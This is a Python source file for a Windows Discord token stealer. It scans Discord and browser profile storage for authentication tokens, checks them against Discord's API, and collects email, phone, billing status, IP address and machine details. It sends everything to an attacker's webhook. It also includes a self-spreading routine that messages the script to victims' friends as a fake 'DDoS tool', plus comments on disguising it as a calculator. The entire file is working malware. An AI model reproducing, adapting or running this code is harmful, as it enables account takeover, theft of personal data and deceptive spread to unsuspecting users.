import os
import sys,time,random

if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv

WEBHOOK_URL = "" # Insert webhook url here

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Microsoft Edge": LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
    "Microsoft Edge Profile 1": LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 1",
    "Microsoft Edge Profile 2": LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 2",
    "Microsoft Edge Profile 3": LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 3",
    "Microsoft Edge Profile 4": LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 4",
    "Microsoft Edge Profile 5": LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 5",
    "Microsoft Edge Profile 6": LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 6",
    "Microsoft Edge Profile 7": LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 7",
    "Microsoft Edge Profile 8": LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 8",
    "Microsoft Edge Profile 9": LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 9",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Google Chrome Profile 1": LOCAL + "\\Google\\Chrome\\User Data\\Profile 1",
    "Google Chrome Profile 2": LOCAL + "\\Google\\Chrome\\User Data\\Profile 2",
    "Google Chrome Profile 3": LOCAL + "\\Google\\Chrome\\User Data\\Profile 3",
    "Google Chrome Profile 4": LOCAL + "\\Google\\Chrome\\User Data\\Profile 4",
    "Google Chrome Profile 5": LOCAL + "\\Google\\Chrome\\User Data\\Profile 5",
    "Google Chrome Profile 6": LOCAL + "\\Google\\Chrome\\User Data\\Profile 6",
    "Google Chrome Profile 7": LOCAL + "\\Google\\Chrome\\User Data\\Profile 7",
    "Google Chrome Profile 8": LOCAL + "\\Google\\Chrome\\User Data\\Profile 8",
    "Google Chrome Profile 9": LOCAL + "\\Google\\Chrome\\User Data\\Profile 9",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
    "Microsoft Edge Canary": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Default",
    "Microsoft Edge Canary Profile 1": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 1",
    "Microsoft Edge Canary Profile 2": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 2",
    "Microsoft Edge Canary Profile 3": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 3",
    "Microsoft Edge Canary Profile 4": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 4",
    "Microsoft Edge Canary Profile 5": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 5",
    "Microsoft Edge Canary Profile 6": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 6",
    "Microsoft Edge Canary Profile 7": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 7",
    "Microsoft Edge Canary Profile 8": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 8",
    "Microsoft Edge Canary Profile 9": LOCAL + "\\Microsoft\\Edge SxS\\User Data\\Profile 9"
}

def slowprint(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.1)

def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass


def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def whoTheFuckAmI():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip


def hWiD():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getHeader(token))).read().decode())
    except:
        pass


def getChat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass


def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass


def sendMessages(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass

def calculator():
  
    # Function to add two numbers 
    def add(num1, num2):
        return num1 + num2
  
    # Function to subtract two numbers 
    def subtract(num1, num2):
        return num1 - num2
  
    # Function to multiply two numbers
    def multiply(num1, num2):
        return num1 * num2
  
    # Function to divide two numbers
    def divide(num1, num2):
        return num1 / num2

    slowprint("Please select operation -\n1. Add\n2. Subtract\n3. Multiply\n4. Divide\n")
  
  
    # Take input from the user 
    select = int(input("Select operations form 1, 2, 3, 4 :"))
  
    number_1 = int(input("Enter first number: "))
    number_2 = int(input("Enter second number: "))
  
    if select == 1:
        print(number_1, "+", number_2, "=",
                    add(number_1, number_2))
  
    elif select == 2:
        print(number_1, "-", number_2, "=",
                        subtract(number_1, number_2))
  
    elif select == 3:
        print(number_1, "*", number_2, "=",
                        multiply(number_1, number_2))
  
    elif select == 4:
        print(number_1, "/", number_2, "=",
                        divide(number_1, number_2))
    else:
        print("Invalid input")


def spread(token, form_data, delay):
    return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
    for friend in getFriends(token):
        try:
            chat_id = getChat(token, friend["id"])
            sendMessages(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)


def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(paymentMethods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "|Account Info|",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "|PC Info|",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "|Token|",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Token Grabber",
        "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
    }
    try:
        
        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()

try:
    main()
    # calculator() 
    # Remove the above comment if you want to disguise the stealer as a calculator, also add "input("Press Enter to continue...")" at the bottom.
except Exception as e:
    print(e)
    pass
